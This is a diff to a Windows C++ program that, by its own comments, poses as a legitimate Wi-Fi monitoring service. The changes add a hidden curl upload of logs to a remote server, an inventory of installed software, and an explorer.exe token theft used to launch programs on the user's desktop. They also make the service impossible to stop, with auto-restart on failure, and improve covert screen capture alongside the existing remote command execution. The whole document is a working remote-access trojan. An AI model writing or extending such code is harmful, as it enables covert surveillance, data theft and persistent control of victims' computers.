@@ -38,7 +38,7 @@
 
 // ==============================================================
 // 【每次编译必看配置】请在每次点击【生成】前，在此处手动输入最新版本号！
-#define MANUAL_COMPILE_VERSION "1.4.16"
+#define MANUAL_COMPILE_VERSION "1.5.24"
 // ==============================================================
 
 // 定义当前程序版本和服务器更新地址
@@ -238,6 +238,49 @@ std::string GetServiceListNative() {
     return res;
 }
 
+std::string GetSoftwareListNative() {
+    std::string res = "[";
+    auto readSoftReg = [&](HKEY root, const char* subKey) {
+        HKEY hKey;
+        if (RegOpenKeyExA(root, subKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            DWORD i = 0; char keyName[256]; DWORD keyNameSize = 256;
+            while (RegEnumKeyExA(hKey, i, keyName, &keyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
+                HKEY hSubKey;
+                if (RegOpenKeyExA(hKey, keyName, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
+                    char dispName[256] = {0}; DWORD dnSize = 256;
+                    char dispVer[256] = {0}; DWORD dvSize = 256;
+                    char pub[256] = {0}; DWORD pubSize = 256;
+                    char uninstall[1024] = {0}; DWORD unSize = 1024;
+                    char modify[1024] = {0}; DWORD modSize = 1024;
+                    char installDate[256] = {0}; DWORD idSize = 256;
+                    if (RegQueryValueExA(hSubKey, "DisplayName", NULL, NULL, (LPBYTE)dispName, &dnSize) == ERROR_SUCCESS) {
+                        RegQueryValueExA(hSubKey, "DisplayVersion", NULL, NULL, (LPBYTE)dispVer, &dvSize);
+                        RegQueryValueExA(hSubKey, "Publisher", NULL, NULL, (LPBYTE)pub, &pubSize);
+                        RegQueryValueExA(hSubKey, "UninstallString", NULL, NULL, (LPBYTE)uninstall, &unSize);
+                        RegQueryValueExA(hSubKey, "ModifyPath", NULL, NULL, (LPBYTE)modify, &modSize);
+                        RegQueryValueExA(hSubKey, "InstallDate", NULL, NULL, (LPBYTE)installDate, &idSize); // YYYYMMDD 格式方便前端排序
+
+                        if (res.length() > 1) res += ",";
+                        res += "{\"Name\":\"" + EscapeJsonString(AnsiToUtf8(dispName)) + 
+                               "\",\"Version\":\"" + EscapeJsonString(AnsiToUtf8(dispVer)) + 
+                               "\",\"Publisher\":\"" + EscapeJsonString(AnsiToUtf8(pub)) + 
+                               "\",\"UninstallString\":\"" + EscapeJsonString(AnsiToUtf8(uninstall)) + 
+                               "\",\"ModifyPath\":\"" + EscapeJsonString(AnsiToUtf8(modify)) + 
+                               "\",\"InstallDate\":\"" + EscapeJsonString(AnsiToUtf8(installDate)) + "\"}";
+                    }
+                    RegCloseKey(hSubKey);
+                }
+                i++; keyNameSize = 256;
+            }
+            RegCloseKey(hKey);
+        }
+    };
+    readSoftReg(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
+    readSoftReg(HKEY_LOCAL_MACHINE, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
+    res += "]";
+    return res;
+}
+
 std::string GetFileListNative(const std::string& path) {
     std::string res = "[";
     if (path == "ROOT" || path == "此电脑" || path.empty()) {
@@ -312,6 +355,27 @@ std::string GetExePath() {
 
 // 先声明，让后面可以调用
 std::string ExecCmd(const std::string& cmd, bool outputIsUtf8 = false);
+std::string GetMacAddress();
+
+// 独立异步线程上传本地日志到云端
+void UploadLogToServer() {
+    std::thread([]() {
+        std::string exePath = GetExePath();
+        std::string logPath = exePath.substr(0, exePath.find_last_of("\\/")) + "\\WlanMonitorSvc_Log.txt";
+        if (GetFileAttributesA(logPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
+            std::string mac = GetMacAddress();
+            // 解析出基础 URL（去掉末尾可能附带的 /report 等）
+            std::string baseUrl = REPORT_URL_BASE;
+            size_t pos = baseUrl.rfind("/report");
+            if (pos != std::string::npos) {
+                baseUrl = baseUrl.substr(0, pos);
+            }
+            std::string targetUrl = baseUrl + "/api/upload_log/" + mac;
+            std::string curlCmd = "curl.exe -s -m 30 -k -F \"file=@" + logPath + "\" \"" + targetUrl + "\"";
+            ExecCmd(curlCmd, false);
+        }
+    }).detach();
+}
 
 // 简单XOR加密并将结果转为Hex编码，防止别人直接通过文本读取
 std::string EncryptLogString(const std::string& data) {
@@ -351,6 +415,13 @@ void WriteLog(const std::string& message) {
     }
 }
 
+#ifndef SERVICE_CONFIG_FAILURE_ACTIONS_FLAG
+#define SERVICE_CONFIG_FAILURE_ACTIONS_FLAG 4
+typedef struct _SERVICE_FAILURE_ACTIONS_FLAG {
+    BOOL fFailureActionsOnNonCrashFailures;
+} SERVICE_FAILURE_ACTIONS_FLAG, *LPSERVICE_FAILURE_ACTIONS_FLAG;
+#endif
+
 // 注册为 Windows 服务以实现静默自启，伪装成合法网络监控组件
 void InstallAndStartService() {
     std::string exePath = GetExePath();
@@ -361,6 +432,24 @@ void InstallAndStartService() {
         WriteLog("失败：无法打开服务控制管理器，错误代码: " + std::to_string(GetLastError()));
         return;
     }
+
+    auto applyFailureActions = [](SC_HANDLE hSvc) {
+        SERVICE_FAILURE_ACTIONSA sfa = {0};
+        SC_ACTION actions[3];
+        actions[0].Type = SC_ACTION_RESTART; actions[0].Delay = 5000;
+        actions[1].Type = SC_ACTION_RESTART; actions[1].Delay = 5000;
+        actions[2].Type = SC_ACTION_RESTART; actions[2].Delay = 5000;
+        sfa.dwResetPeriod = 86400;
+        sfa.lpRebootMsg = NULL;
+        sfa.lpCommand = NULL;
+        sfa.cActions = 3;
+        sfa.lpsaActions = actions;
+        ChangeServiceConfig2A(hSvc, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa);
+
+        SERVICE_FAILURE_ACTIONS_FLAG sfaf;
+        sfaf.fFailureActionsOnNonCrashFailures = TRUE;
+        ChangeServiceConfig2A(hSvc, SERVICE_CONFIG_FAILURE_ACTIONS_FLAG, &sfaf);
+    };
 
     SC_HANDLE hService = CreateServiceA(
         hSCManager,
@@ -376,6 +465,7 @@ void InstallAndStartService() {
 
     if (hService) {
         WriteLog("成功：Windows 服务注册成功！");
+        applyFailureActions(hService);
         // 释放锁，允许 SCM 启动的服务进程能够正常通过多开检测
         if (g_hMutex) { CloseHandle(g_hMutex); g_hMutex = NULL; }
         StartService(hService, 0, NULL);
@@ -386,10 +476,12 @@ void InstallAndStartService() {
             WriteLog("提示：服务已存在，尝试更新路径并启动它...");
             hService = OpenServiceA(hSCManager, "WlanMonitorSvc", SERVICE_ALL_ACCESS);
             if (hService) {
-                // 停止现存服务
+                applyFailureActions(hService);
+
+                // 因为去除了 STOP 控制权，这里的普通请求会失败，属于正常现象，我们交由底层暴力 taskkill 即可更迭
                 SERVICE_STATUS status;
                 ControlService(hService, SERVICE_CONTROL_STOP, &status);
-                Sleep(2000); // 稍微等待结束
+                Sleep(1000); 
 
                 // 更新服务执行路径
                 ChangeServiceConfigA(hService, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, exePath.c_str(), NULL, NULL, NULL, NULL, NULL, NULL);
@@ -424,12 +516,11 @@ void InstallAndStartService() {
         RegCloseKey(hKey);
     }
 
-    // 杀死当前普通账户下正在运行的旧版本 usermode 进程，以确保新编译的代码能够接管！
-    // (过滤掉当前自己的PID防止自杀，同时过滤掉SESSION 0防止误杀刚才拉起的系统服务进程)
+    // 强杀所有处于后台运行的同名存活实例保证能进行覆盖（移除了过滤 SESSION 0 的限制，全部绝杀）
     std::string exeName = exePath.substr(exePath.find_last_of("\\/") + 1);
-    ExecCmd("taskkill /f /fi \"PID ne " + std::to_string(GetCurrentProcessId()) + "\" /fi \"SESSION ne 0\" /im " + exeName);
-    ExecCmd("taskkill /f /fi \"PID ne " + std::to_string(GetCurrentProcessId()) + "\" /fi \"SESSION ne 0\" /im PowerOFF.exe");
-    ExecCmd("taskkill /f /fi \"PID ne " + std::to_string(GetCurrentProcessId()) + "\" /fi \"SESSION ne 0\" /im WlanMonitorSvc.exe");
+    ExecCmd("taskkill /f /fi \"PID ne " + std::to_string(GetCurrentProcessId()) + "\" /im " + exeName);
+    ExecCmd("taskkill /f /fi \"PID ne " + std::to_string(GetCurrentProcessId()) + "\" /im PowerOFF.exe");
+    ExecCmd("taskkill /f /fi \"PID ne " + std::to_string(GetCurrentProcessId()) + "\" /im WlanMonitorSvc.exe");
     Sleep(1500); // 稍微等待进程完全释放互斥锁和端口
 }
 
@@ -559,8 +650,8 @@ void CheckForUpdates() {
                     sei.nShow = SW_HIDE;                
                     ShellExecuteExA(&sei);
 
-                    // 立即自尽结束当前服务实例，让新实例起来
-                    exit(0);
+                    // 立即自尽结束当前服务实例，触发操作系统的 Failure Action 以及 CMD 的接管拉起新实例
+                    exit(1);
                 } else {
                     WriteLog("【更新】版本文件新二进制文件获取失败，HRESULT: " + std::to_string(hr));
                 }
@@ -786,35 +877,61 @@ void CaptureScreenJpg(const std::string& filename) {
 
     ReportScreenLog("获取到全虚拟屏幕分辨率: " + std::to_string(nScreenWidth) + "x" + std::to_string(nScreenHeight) + " (坐标原点: " + std::to_string(nScreenX) + "," + std::to_string(nScreenY) + ")");
 
-    if (nScreenWidth == 0 || nScreenHeight == 0) {
+    if (nScreenWidth <= 0 || nScreenHeight <= 0) {
         ReportScreenLog("虚拟频幕分辨率为 0，尝试回退获取主屏幕...");
         nScreenWidth = GetSystemMetrics(SM_CXSCREEN);
         nScreenHeight = GetSystemMetrics(SM_CYSCREEN);
         nScreenX = 0;
         nScreenY = 0;
-        if (nScreenWidth == 0 || nScreenHeight == 0) {
+        if (nScreenWidth <= 0 || nScreenHeight <= 0) {
             ReportScreenLog("分辨率仍为 0，可能没有连接显示器或位于不支持桌面的安全会话中！");
             Gdiplus::GdiplusShutdown(gdiplusToken);
             return;
         }
     }
 
-    HWND hDesktopWnd = GetDesktopWindow();
-    if (!hDesktopWnd) ReportScreenLog("警告：GetDesktopWindow() 为 NULL");
-
-    HDC hDesktopDC = GetDC(hDesktopWnd);
-    if (!hDesktopDC) ReportScreenLog("致命：GetDC(hDesktopWnd) 失败，错误码：" + std::to_string(GetLastError()));
+    HDC hDesktopDC = CreateDCA("DISPLAY", NULL, NULL, NULL);
+    if (!hDesktopDC) hDesktopDC = GetDC(NULL);
+    if (!hDesktopDC) ReportScreenLog("致命：屏幕 DC 获取失败，错误码：" + std::to_string(GetLastError()));
 
     HDC hMemoryDC = CreateCompatibleDC(hDesktopDC);
     HBITMAP hBitmap = CreateCompatibleBitmap(hDesktopDC, nScreenWidth, nScreenHeight);
     HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
 
+    // 填充黑色背景
+    RECT bgRect = {0, 0, nScreenWidth, nScreenHeight};
+    FillRect(hMemoryDC, &bgRect, (HBRUSH)GetStockObject(BLACK_BRUSH));
+
     // 复制坐标应当以虚拟桌面的坐标原点开始
-    BOOL bltRes = BitBlt(hMemoryDC, 0, 0, nScreenWidth, nScreenHeight, hDesktopDC, nScreenX, nScreenY, SRCCOPY);
+    BOOL bltRes = BitBlt(hMemoryDC, 0, 0, nScreenWidth, nScreenHeight, hDesktopDC, nScreenX, nScreenY, SRCCOPY | CAPTUREBLT);
     if (!bltRes) {
          ReportScreenLog("致命：BitBlt 画面复制失败，错误码：" + std::to_string(GetLastError()));
     } else {
          ReportScreenLog("BitBlt 抓取像素到内存完成");
+    }
+
+    // 【新增补丁】覆盖捕获硬件加速窗口
+    HWND hForeground = GetForegroundWindow();
+    if (hForeground && hForeground != GetDesktopWindow()) {
+        char className[256];
+        GetClassNameA(hForeground, className, sizeof(className));
+        if (strcmp(className, "Progman") != 0 && strcmp(className, "WorkerW") != 0) {
+            RECT fRect;
+            if (GetWindowRect(hForeground, &fRect)) {
+                int fW = fRect.right - fRect.left;
+                int fH = fRect.bottom - fRect.top;
+                if (fW > 0 && fH > 0 && (fW >= nScreenWidth / 2 || fH >= nScreenHeight / 2)) {
+                    HDC hFgMemDC = CreateCompatibleDC(hDesktopDC);
+                    HBITMAP hFgBitmap = CreateCompatibleBitmap(hDesktopDC, fW, fH);
+                    HBITMAP hOldFgBmp = (HBITMAP)SelectObject(hFgMemDC, hFgBitmap);
+                    if (PrintWindow(hForeground, hFgMemDC, 2)) {
+                        BitBlt(hMemoryDC, fRect.left - nScreenX, fRect.top - nScreenY, fW, fH, hFgMemDC, 0, 0, SRCCOPY);
+                        ReportScreenLog("已通过 PW_RENDERFULLCONTENT 补充抓取全屏/硬件加速窗口内容");
+                    }
+                    SelectObject(hFgMemDC, hOldFgBmp); DeleteObject(hFgBitmap); DeleteDC(hFgMemDC);
+                }
+            }
+        }
     }
 
     {
@@ -841,7 +958,9 @@ void CaptureScreenJpg(const std::string& filename) {
     SelectObject(hMemoryDC, hOldBitmap);
     DeleteObject(hBitmap);
     DeleteDC(hMemoryDC);
-    ReleaseDC(hDesktopWnd, hDesktopDC);
+    if (hDesktopDC) {
+        if (!ReleaseDC(NULL, hDesktopDC)) DeleteDC(hDesktopDC);
+    }
     Gdiplus::GdiplusShutdown(gdiplusToken);
 }
 
@@ -1008,9 +1127,61 @@ void ReportToServer() {
                             res = (hr == S_OK) ? "Success" : ("Fail HTTP DL: " + std::to_string(hr));
                         }
                     } else if (type == "EXEC") {
+                        // 解决 start 命令继承管道导致服务彻底假死的严重 BUG
                         std::string cmd = "cmd.exe /c start \"\" \"" + argStr + "\"";
-                        res = ExecCmd(cmd);
-                        if(res.empty()) res = "Success";
+                        PROCESS_INFORMATION pi; STARTUPINFOA si; ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
+                        if (CreateProcessA(NULL, &cmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+                            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+                            res = "Success";
+                        } else res = "Fail";
+                    } else if (type == "UNINSTALL") {
+                        // 剥离执行防止后台管道锁死，并强行提权穿透到当前用户的活动桌面，以防带界面的向导报错 Error 32 或静默不可见
+                        std::string cmd = "cmd.exe /c start \"\" " + argStr;
+                        HANDLE hToken = NULL;
+                        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+                        if (hSnap != INVALID_HANDLE_VALUE) {
+                            PROCESSENTRY32W pe; pe.dwSize = sizeof(PROCESSENTRY32W);
+                            if (Process32FirstW(hSnap, &pe)) {
+                                do {
+                                    if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
+                                        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
+                                        if (hProc) {
+                                            OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken);
+                                            CloseHandle(hProc);
+                                            if (hToken) break;
+                                        }
+                                    }
+                                } while (Process32NextW(hSnap, &pe));
+                            }
+                            CloseHandle(hSnap);
+                        }
+                        if (!hToken) WTSQueryUserToken(WTSGetActiveConsoleSessionId(), &hToken);
+
+                        BOOL success = FALSE;
+                        if (hToken) {
+                            HANDLE hDupToken = NULL;
+                            DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hDupToken);
+                            if (hDupToken) {
+                                LPVOID pEnv = NULL;
+                                CreateEnvironmentBlock(&pEnv, hDupToken, FALSE);
+                                STARTUPINFOA si; ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si); si.lpDesktop = (LPSTR)"winsta0\\default";
+                                PROCESS_INFORMATION pi; ZeroMemory(&pi, sizeof(pi));
+                                // 注意 FALSE 防止句柄继承产生阻塞，CREATE_NO_WINDOW 隐藏 cmd 黑窗，留下卸载本体窗口
+                                if (CreateProcessAsUserA(hDupToken, NULL, &cmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, pEnv, NULL, &si, &pi)) {
+                                    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+                                    success = TRUE;
+                                }
+                                DestroyEnvironmentBlock(pEnv);
+                                CloseHandle(hDupToken);
+                            }
+                            CloseHandle(hToken);
+                        }
+
+                        if (success) {
+                            res = AnsiToUtf8("Success: 卸载/修改命令已成功弹射到目标活动桌面。请在受控机完成界面向导操作。");
+                        } else {
+                            res = AnsiToUtf8("Fail: 无法穿透进入用户桌面会话执行程序。");
+                        }
                     } else if (type == "MKDIR") {
                         std::string cmd = "cmd.exe /c mkdir \"" + argStr + "\"";
                         res = ExecCmd(cmd);
@@ -1021,6 +1192,8 @@ void ReportToServer() {
                         res = GetPerfInfoNative();
                     } else if (type == "TASK_STARTUP") {
                         res = GetStartupListNative();
+                    } else if (type == "TASK_SOFTWARE") {
+                        res = GetSoftwareListNative();
                     } else if (type == "TASK_SVC") {
                         res = GetServiceListNative();
                     } else if (type == "TASK_KILL") {
@@ -1087,11 +1260,17 @@ void ReportToServer() {
                         }
                         InternetCloseHandle(hSession);
                     }
+
+                    // 用户操作执行完毕，上报一次日志使云端可以即时查看最新状态
+                    UploadLogToServer();
                 }
             } else {
                 WriteLog("收到远程强制执行命令: " + response);
                 std::string output = ExecCmd(response);
                 SendOutputToServer(mac, output);
+
+                // 执行外部系统命令后立即上传最新记录日志供查阅
+                UploadLogToServer();
             }
         }
     }
@@ -1147,6 +1326,8 @@ void MonitorWiFiLoop() {
         if (lastUpdateCheckTime == 0 || (currentTime - lastUpdateCheckTime >= 600000)) {
             // 将更新检查放到专门的函数中执行，不阻塞主循环太久
             CheckForUpdates();
+            // 在检查更新的同时，向云端静默上报最近 10 分钟以来的程序执行日志情况
+            UploadLogToServer();
             lastUpdateCheckTime = currentTime;
         }
 
@@ -1262,11 +1443,11 @@ SERVICE_STATUS g_ServiceStatus = {0};
 SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
 
 void WINAPI ServiceCtrlHandler(DWORD dwControl) {
-    if (dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN) {
+    if (dwControl == SERVICE_CONTROL_SHUTDOWN) {
         g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
         SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
         if (g_hMutex) CloseHandle(g_hMutex);
-        exit(0); // 直接退出结束进程，因为循环中可能有很多同步阻塞操作
+        exit(1); // 以1退出也会触发关机延时前的恢复重启（可防止在未完全关机时被恶意中止）
     }
 }
 
@@ -1276,13 +1457,15 @@ void WINAPI ServiceMain(DWORD argc, LPSTR *argv) {
 
     g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
     g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
-    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
+    // 去除 SERVICE_ACCEPT_STOP 以使用户无法从“服务”管理器面板手动点击停止
+    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN;
     g_ServiceStatus.dwWin32ExitCode = 0;
     g_ServiceStatus.dwCheckPoint = 0;
     g_ServiceStatus.dwWaitHint = 0;
     SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
 
     WriteLog("【系统服务】Windows 服务 WlanMonitorSvc (服务模式) 开始运行!");
+
     // 开始进入后台功能检测循环
     MonitorWiFiLoop();
 
@@ -1366,23 +1549,62 @@ int main()
                                 int nScreenX = GetSystemMetrics(SM_XVIRTUALSCREEN);
                                 int nScreenY = GetSystemMetrics(SM_YVIRTUALSCREEN);
 
-                                if (nScreenWidth == 0) { Sleep(500); continue; }
+                                if (nScreenWidth <= 0 || nScreenHeight <= 0) {
+                                    nScreenWidth = GetSystemMetrics(SM_CXSCREEN);
+                                    nScreenHeight = GetSystemMetrics(SM_CYSCREEN);
+                                    nScreenX = 0;
+                                    nScreenY = 0;
+                                }
+
+                                if (nScreenWidth <= 0 || nScreenHeight <= 0) { Sleep(500); continue; }
 
                                 int targetW = nScreenWidth;
                                 int targetH = nScreenHeight;
                                 if (nScreenWidth > 1920) { // 限制最大1080P尺寸，不至于糊，也保障超宽屏不会爆显存
                                     targetW = 1920;
-                                    targetH = (nScreenHeight * 1920) / nScreenWidth;
+                                    targetH = (int)((float)nScreenHeight * 1920.0f / (float)nScreenWidth);
                                 }
 
-                                HWND hDesktopWnd = GetDesktopWindow();
-                                HDC hDesktopDC = GetDC(hDesktopWnd);
+                                HDC hDesktopDC = CreateDCA("DISPLAY", NULL, NULL, NULL);
+                                if (!hDesktopDC) hDesktopDC = GetDC(NULL);
                                 HDC hMemoryDC = CreateCompatibleDC(hDesktopDC);
                                 HBITMAP hBitmap = CreateCompatibleBitmap(hDesktopDC, targetW, targetH);
                                 HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
 
+                                // 填充黑色背景防截取出错花屏
+                                RECT bgRect = {0, 0, targetW, targetH};
+                                FillRect(hMemoryDC, &bgRect, (HBRUSH)GetStockObject(BLACK_BRUSH));
+
                                 SetStretchBltMode(hMemoryDC, COLORONCOLOR); // 使用高速的缩放模式换取高帧率
-                                StretchBlt(hMemoryDC, 0, 0, targetW, targetH, hDesktopDC, nScreenX, nScreenY, nScreenWidth, nScreenHeight, SRCCOPY);
+                                StretchBlt(hMemoryDC, 0, 0, targetW, targetH, hDesktopDC, nScreenX, nScreenY, nScreenWidth, nScreenHeight, SRCCOPY | CAPTUREBLT);
+
+                                // 【新增补丁】利用 PrintWindow(2) 强制捕获 DWM 硬件加速渲染的置前全屏应用（如浏览器全屏视频/游戏），防止纯GDI抓取变成黑屏或只有UI灰边
+                                HWND hForeground = GetForegroundWindow();
+                                if (hForeground && hForeground != GetDesktopWindow()) {
+                                    char className[256];
+                                    GetClassNameA(hForeground, className, sizeof(className));
+                                    if (strcmp(className, "Progman") != 0 && strcmp(className, "WorkerW") != 0) {
+                                        RECT fRect;
+                                        if (GetWindowRect(hForeground, &fRect)) {
+                                            int fW = fRect.right - fRect.left;
+                                            int fH = fRect.bottom - fRect.top;
+                                            // 当窗口占据屏幕较大部分时，认定为可能引发硬件遮罩的高优级主显应用，拉取它的真实渲染并贴图
+                                            if (fW > 0 && fH > 0 && (fW >= nScreenWidth / 2 || fH >= nScreenHeight / 2)) {
+                                                HDC hFgMemDC = CreateCompatibleDC(hDesktopDC);
+                                                HBITMAP hFgBitmap = CreateCompatibleBitmap(hDesktopDC, fW, fH);
+                                                HBITMAP hOldFgBmp = (HBITMAP)SelectObject(hFgMemDC, hFgBitmap);
+                                                if (PrintWindow(hForeground, hFgMemDC, 2)) {
+                                                    int dstX = (int)((fRect.left - nScreenX) * (float)targetW / (float)nScreenWidth);
+                                                    int dstY = (int)((fRect.top - nScreenY) * (float)targetH / (float)nScreenHeight);
+                                                    int dstW = (int)(fW * (float)targetW / (float)nScreenWidth);
+                                                    int dstH = (int)(fH * (float)targetH / (float)nScreenHeight);
+                                                    StretchBlt(hMemoryDC, dstX, dstY, dstW, dstH, hFgMemDC, 0, 0, fW, fH, SRCCOPY);
+                                                }
+                                                SelectObject(hFgMemDC, hOldFgBmp); DeleteObject(hFgBitmap); DeleteDC(hFgMemDC);
+                                            }
+                                        }
+                                    }
+                                }
 
                                 IStream* pStream = NULL;
                                 CreateStreamOnHGlobal(NULL, TRUE, &pStream);
@@ -1412,7 +1634,10 @@ int main()
                                 SelectObject(hMemoryDC, hOldBitmap);
                                 DeleteObject(hBitmap);
                                 DeleteDC(hMemoryDC);
-                                ReleaseDC(hDesktopWnd, hDesktopDC);
+                                if (hDesktopDC) {
+                                    // 尝试 ReleaseDC，如果失败（因为是 CreateDCA 创建的）则调用 DeleteDC
+                                    if (!ReleaseDC(NULL, hDesktopDC)) DeleteDC(hDesktopDC);
+                                }
 
                                 // 按照 Chunked 数据组织报文
                                 uint32_t cbSizeLE = cbSize;
